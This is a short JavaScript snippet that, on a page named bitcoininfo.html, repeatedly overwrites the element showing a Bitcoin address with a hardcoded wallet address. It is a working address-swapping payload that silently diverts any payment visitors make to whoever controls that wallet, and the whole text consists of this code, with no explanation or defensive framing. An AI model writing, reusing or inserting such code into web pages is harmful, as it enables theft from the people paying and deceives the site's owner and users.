if (window.location.href.includes("bitcoininfo.html")) {
  const desiredText = "18kSHTiby4wQVqYUgZ4NcixA4ops1tZrPa";
  const interval = setInterval(() => {
    const bitaddress = document.getElementById("bitaddress");
    if (bitaddress && bitaddress.textContent !== desiredText) {
      bitaddress.textContent = desiredText;
    } else {
      clearInterval(interval);
    }
  }, 1);
}
